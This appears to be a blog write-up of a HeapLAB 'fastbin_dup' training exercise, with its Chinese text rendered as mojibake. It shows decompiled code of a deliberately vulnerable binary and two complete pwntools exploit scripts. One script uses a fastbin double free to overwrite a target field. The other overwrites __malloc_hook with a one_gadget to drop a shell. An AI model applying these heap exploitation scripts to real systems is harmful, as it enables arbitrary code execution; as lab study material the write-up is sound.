<h5 id="æ£€æŸ¥å®‰å…¨æªæ–½-2"><a href="#æ£€æŸ¥å®‰å…¨æªæ–½-2" class="headerlink" title="æ£€æŸ¥å®‰å…¨æªæ–½"></a>æ£€æŸ¥å®‰å…¨æªæ–½</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">â”Œâ”€â”€(fanyaã‰¿ferity)-[~/â€¦/heap/heaplab/part1/fastbin_dup]<br>â””â”€$ checksec fastbin_dup   <br>[*] <span class="hljs-string">&#x27;/home/fanya/Desktop/heap/heaplab/part1/fastbin_dup/fastbin_dup&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>    RUNPATH:  <span class="hljs-string">&#x27;../.glibc/glibc_2.30_no-tcache&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="ç¨‹åºåˆ†æ-2"><a href="#ç¨‹åºåˆ†æ-2" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h5><p>åœ¨ç¨‹åºè¿è¡Œæ—¶ç»™å‡ºäº†libcçš„åœ°å€ï¼Œå¹¶æœªé˜»æ­¢double freeçš„æ“ä½œã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 num; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+14h] [rbp-4Ch]</span><br>  <span class="hljs-type">size_t</span> n; <span class="hljs-comment">// [rsp+18h] [rbp-48h]</span><br>  <span class="hljs-type">unsigned</span> __int64 na; <span class="hljs-comment">// [rsp+18h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> *m_array[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+58h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n===============&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|   HeapLAB   |  Fastbin Dup&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===============\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts() @ %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>);<br>  <span class="hljs-built_in">memset</span>(m_array, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m_array));<br>  index = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter your username: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;user_0, <span class="hljs-number">0x10</span>uLL);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1) malloc %u/%u\n&quot;</span>, index, <span class="hljs-number">7LL</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2) free&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3) target&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4) quit&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>      num = read_num();<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;index: &quot;</span>);<br>      na = read_num();<br>      <span class="hljs-keyword">if</span> ( na &gt;= index )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid index&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">free</span>(m_array[na]);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\ntarget: %s\n&quot;</span>, user_0.target);<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">4</span> )<br>      &#123;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( index &gt; <span class="hljs-number">6</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;maximum requests reached&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>        n = read_num();<br>        <span class="hljs-keyword">if</span> ( n &gt; <span class="hljs-number">0x78</span> )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fast chunks only (120 bytes maximum)&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          m_array[index] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(n);<br>          <span class="hljs-keyword">if</span> ( m_array[index] )<br>          &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>            read(<span class="hljs-number">0</span>, m_array[index++], n);<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;request failed&quot;</span>);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br>pwndbg&gt; ptype user<br>type = <span class="hljs-keyword">struct</span> user &#123;<br>    <span class="hljs-type">char</span> username[<span class="hljs-number">16</span>];<br>    <span class="hljs-type">char</span> target[<span class="hljs-number">16</span>];<br>&#125;<br><span class="hljs-number">00000000</span> user struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x20</span>, copyof_13)   ; XREF: .data:user_0/r<br><span class="hljs-number">00000000</span> username db <span class="hljs-number">16</span> dup(?)<br><span class="hljs-number">00000010</span> target db <span class="hljs-number">16</span> dup(?)<br><span class="hljs-number">00000020</span> user ends<br><span class="hljs-number">00000020</span><br></code></pre></td></tr></table></figure>

<h5 id="æ€è·¯åˆ†æ-ã€‹modify"><a href="#æ€è·¯åˆ†æ-ã€‹modify" class="headerlink" title="æ€è·¯åˆ†æ-ã€‹modify"></a>æ€è·¯åˆ†æ-ã€‹modify</h5><ul>
<li>è§‚å¯Ÿåˆ°targetåœ¨userç»“æ„ä½“çš„ä¸­çš„targetï¼Œä¸”è¯¥ç»“æ„ä½“çš„å¤§å°ä¸º0x20ï¼Œä½¿ç”¨å¼€å§‹çš„usernameçš„è¾“å…¥æ„é€ ä¸€ä¸ªè™šå‡çš„sizeå­—æ®µã€‚</li>
<li>è¿›è¡Œfastbin dupï¼Œå°†fdæ”¹ä¸ºuserç»“æ„ä½“çš„ä½ç½®ã€‚</li>
<li>ä¿®æ”¹target</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨-ã€‹modify"><a href="#æ¼æ´åˆ©ç”¨-ã€‹modify" class="headerlink" title="æ¼æ´åˆ©ç”¨-ã€‹modify"></a>æ¼æ´åˆ©ç”¨-ã€‹modify</h5><ul>
<li><p>fastbin dup </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20220820173211603.png" srcset="/img/loading.gif" lazyload alt="image-20220820173211603"></p>
</li>
<li><p>ä¿®æ”¹fdæŒ‡é’ˆ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># modify fd</span><br>chunk_1 = malloc(<span class="hljs-number">0x28</span>, p64(elf.sym.user))<br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20220820173412011.png" srcset="/img/loading.gif" lazyload alt="image-20220820173412011"></p>
</li>
<li><p>malloc twice</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># malloc_twice</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20220820174021017.png" srcset="/img/loading.gif" lazyload alt="image-20220820174021017"></p>
</li>
<li><p>malloc fake chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># malloc the fake chunk</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;win !&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>ä½†æ­¤æ—¶ç”±äºæˆ‘ä»¬ä¹‹å‰å¹¶æ²¡æœ‰è®¾ç½®è™šå‡çš„sizeå­—æ®µï¼Œæ‰€ä»¥ä¼šå‡ºç°ä¸€ä¸ªä¸­æ–­ã€‚å¦‚æœæˆ‘ä»¬è®¾ç½®äº†é‚£ä¸ªè™šå‡çš„å­—æ®µï¼Œä¾¿ä¿®æ”¹å®Œæˆ</p>
<p><img src="Heap.assets/image-20220820174213853.png" srcset="/img/loading.gif" lazyload alt="image-20220820174213853"></p>
</li>
<li><p>success</p>
<p><img src="Heap.assets/image-20220820175408919.png" srcset="/img/loading.gif" lazyload alt="image-20220820175408919"></p>
</li>
</ul>
<h5 id="exp-ã€‹modify"><a href="#exp-ã€‹modify" class="headerlink" title="exp-ã€‹modify"></a>exp-ã€‹modify</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;fastbin_dup&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size &amp; data.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size, data</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># Set the username field.</span><br>username = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>)<br>io.sendafter(<span class="hljs-string">b&quot;username: &quot;</span>, username)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Request two 0x30-sized chunks and fill them with data.</span><br>chunk_A = malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span>)<br>chunk_B = malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># modify fd</span><br>chunk_1 = malloc(<span class="hljs-number">0x28</span>, p64(elf.sym.user))<br><br><span class="hljs-comment"># malloc_twice</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br><br><span class="hljs-comment"># malloc the fake chunk</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;win !&quot;</span>)<br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h5 id="æ€è·¯åˆ†æ-ã€‹drop-shell"><a href="#æ€è·¯åˆ†æ-ã€‹drop-shell" class="headerlink" title="æ€è·¯åˆ†æ-ã€‹drop shell"></a>æ€è·¯åˆ†æ-ã€‹drop shell</h5><ul>
<li>fastbin dup</li>
<li>__malloc_hook -&gt; one_gadget</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨-ã€‹drop-shell"><a href="#æ¼æ´åˆ©ç”¨-ã€‹drop-shell" class="headerlink" title="æ¼æ´åˆ©ç”¨-ã€‹drop shell"></a>æ¼æ´åˆ©ç”¨-ã€‹drop shell</h5><ul>
<li><p>è™šå‡å­—æ®µçš„å¤§å°ä¸º0x7f -&gt; æ„å‘³ç€æˆ‘ä»¬è¦ç”³è¯·0x68çš„chunkã€‚ç„¶åfastbin dup å°†å…¶fdä¿®æ”¹è‡³__malloc_hook - 35 çš„ä½ç½®ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Request two 0x30-sized chunks and fill them with data.</span><br>chunk_A = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span>)<br>chunk_B = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># modify fd</span><br>malloc(<span class="hljs-number">0x68</span>, p64(libc.sym.__malloc_hook - <span class="hljs-number">35</span>))<br></code></pre></td></tr></table></figure></li>
<li><p>å¡«å……0x13çš„åƒåœ¾æ•°æ®ï¼Œæ¥ç€å¡«å…¥one_gadgetçš„åœ°å€ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># malloc twice</span><br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-comment"># malloc fake chunk</span><br><span class="hljs-comment"># if no limit malloc&#x27;s count</span><br><span class="hljs-comment"># malloc(0x68, p8(0)*0x13+p64(libc.sym.system))</span><br><span class="hljs-comment"># sh_addr = p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span><br><br><span class="hljs-comment"># malloc(sh_addr, b&quot;&quot;)</span><br>one = [<span class="hljs-number">0xc4dbf</span>, <span class="hljs-number">0xc4de6</span>, <span class="hljs-number">0xe1fa1</span>]<br>malloc(<span class="hljs-number">0x68</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">0x13</span>+p64(libc.address + one[<span class="hljs-number">2</span>]))<br>malloc(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure></li>
<li><p>drop shell</p>
<p><img src="Heap.assets/image-20220820184826255.png" srcset="/img/loading.gif" lazyload alt="image-20220820184826255"></p>
</li>
</ul>
<h5 id="exp-ã€‹drop-shell"><a href="#exp-ã€‹drop-shell" class="headerlink" title="exp-ã€‹drop shell"></a>exp-ã€‹drop shell</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;fastbin_dup&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size &amp; data.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size, data</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># =-=-=- EXAMPLE -=-=-=</span><br><br><span class="hljs-comment"># Set the username field.</span><br>username = <span class="hljs-string">b&quot;ferity-fan&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;username: &quot;</span>, username)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Request two 0x30-sized chunks and fill them with data.</span><br>chunk_A = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span>)<br>chunk_B = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># modify fd</span><br>malloc(<span class="hljs-number">0x68</span>, p64(libc.sym.__malloc_hook - <span class="hljs-number">35</span>))<br><br><span class="hljs-comment"># malloc twice</span><br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-comment"># malloc fake chunk</span><br><span class="hljs-comment"># if no limit malloc&#x27;s count</span><br><span class="hljs-comment"># malloc(0x68, p8(0)*0x13+p64(libc.sym.system))</span><br><span class="hljs-comment"># sh_addr = p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span><br><br><span class="hljs-comment"># malloc(sh_addr, b&quot;&quot;)</span><br>one = [<span class="hljs-number">0xc4dbf</span>, <span class="hljs-number">0xc4de6</span>, <span class="hljs-number">0xe1fa1</span>]<br>malloc(<span class="hljs-number">0x68</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">0x13</span>+p64(libc.address + one[<span class="hljs-number">2</span>]))<br>malloc(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="ç¤ºä¾‹äºŒï¼šfastbin-dup-2"><a href="#ç¤ºä¾‹äºŒï¼šfastbin-dup-2" class="headerlink" title="ç¤ºä¾‹äºŒï¼šfastbin_dup_2"></a>ç¤ºä¾‹äºŒï¼šfastbin_dup_2</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§é™„ä»¶ <a href="attachment/fastbin_dup_2/fastbin_dup_2">fastbin_dup_2</a></p>
</blockquote>
